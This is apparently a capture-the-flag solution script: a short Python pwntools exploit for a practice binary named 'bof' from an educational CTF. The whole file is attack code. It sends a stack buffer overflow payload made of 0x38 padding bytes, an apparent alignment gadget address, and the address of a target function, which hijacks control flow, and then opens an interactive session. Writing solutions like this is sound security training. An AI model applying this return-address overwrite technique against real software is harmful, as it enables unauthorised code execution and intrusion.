#!/usr/bin/env python3
from pwn import *

e = ELF("./bof")
r = process("./bof")
r.recvuntil("Welcome to EDU CTF 2019.")

payload = flat(b"\x00"*(0x38),
               p64(0x000000000040071f),
               p64(e.sym.try_to_call_me))
#pause()
r.sendline(payload)

r.interactive()
r.close()
